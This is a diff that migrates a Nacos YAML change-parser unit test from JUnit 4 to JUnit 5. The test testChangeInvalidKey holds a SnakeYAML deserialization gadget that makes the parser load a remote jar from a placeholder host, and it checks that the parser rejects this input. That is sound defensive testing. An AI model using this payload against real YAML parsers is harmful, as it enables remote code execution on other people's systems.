@@ -18,46 +18,50 @@ package com.alibaba.nacos.client.config.impl;
 
 import com.alibaba.nacos.api.config.ConfigChangeItem;
 import com.alibaba.nacos.api.exception.runtime.NacosRuntimeException;
-import org.junit.Assert;
-import org.junit.Test;
+import org.junit.jupiter.api.Test;
 
 import java.io.IOException;
 import java.util.Map;
 
-public class YmlChangeParserTest {
+import static org.junit.jupiter.api.Assertions.assertEquals;
+import static org.junit.jupiter.api.Assertions.assertNull;
+import static org.junit.jupiter.api.Assertions.assertThrows;
+import static org.junit.jupiter.api.Assertions.assertTrue;
+
+class YmlChangeParserTest {
     
     private final YmlChangeParser parser = new YmlChangeParser();
     
     private final String type = "yaml";
     
     @Test
-    public void testType() {
-        Assert.assertTrue(parser.isResponsibleFor(type));
+    void testType() {
+        assertTrue(parser.isResponsibleFor(type));
     }
     
     @Test
-    public void testAddKey() throws IOException {
+    void testAddKey() throws IOException {
         Map<String, ConfigChangeItem> map = parser.doParse("", "app:\n  name: nacos", type);
-        Assert.assertNull(map.get("app.name").getOldValue());
-        Assert.assertEquals("nacos", map.get("app.name").getNewValue());
+        assertNull(map.get("app.name").getOldValue());
+        assertEquals("nacos", map.get("app.name").getNewValue());
     }
     
     @Test
-    public void testRemoveKey() throws IOException {
+    void testRemoveKey() throws IOException {
         Map<String, ConfigChangeItem> map = parser.doParse("app:\n  name: nacos", "", type);
-        Assert.assertEquals("nacos", map.get("app.name").getOldValue());
-        Assert.assertNull(map.get("app.name").getNewValue());
+        assertEquals("nacos", map.get("app.name").getOldValue());
+        assertNull(map.get("app.name").getNewValue());
     }
     
     @Test
-    public void testModifyKey() throws IOException {
+    void testModifyKey() throws IOException {
         Map<String, ConfigChangeItem> map = parser.doParse("app:\n  name: rocketMQ", "app:\n  name: nacos", type);
-        Assert.assertEquals("rocketMQ", map.get("app.name").getOldValue());
-        Assert.assertEquals("nacos", map.get("app.name").getNewValue());
+        assertEquals("rocketMQ", map.get("app.name").getOldValue());
+        assertEquals("nacos", map.get("app.name").getNewValue());
     }
     
     @Test
-    public void testComplexYaml() throws IOException {
+    void testComplexYaml() throws IOException {
         /*
          * map:
          *   key1: "string"
@@ -70,15 +74,17 @@ public class YmlChangeParserTest {
         String s = "map:\n" + "  key1: \"string\"\n" + "  key2:\n" + "    - item1\n" + "    - item2\n" + "    - item3\n"
                 + "  key3: 123    \n";
         Map<String, ConfigChangeItem> map = parser.doParse(s, s, type);
-        Assert.assertEquals(0, map.size());
+        assertEquals(0, map.size());
     }
     
-    @Test(expected = NacosRuntimeException.class)
-    public void testChangeInvalidKey() {
-        parser.doParse("anykey:\n  a",
-                "anykey: !!javax.script.ScriptEngineManager [\n" + "  !!java.net.URLClassLoader [[\n"
-                        + "    !!java.net.URL [\"http://[yourhost]:[port]/yaml-payload.jar\"]\n" + "  ]]\n" + "]",
-                type);
+    @Test
+    void testChangeInvalidKey() {
+        assertThrows(NacosRuntimeException.class, () -> {
+            parser.doParse("anykey:\n  a",
+                    "anykey: !!javax.script.ScriptEngineManager [\n" + "  !!java.net.URLClassLoader [[\n"
+                            + "    !!java.net.URL [\"http://[yourhost]:[port]/yaml-payload.jar\"]\n" + "  ]]\n" + "]",
+                    type);
+        });
     }
 }
 
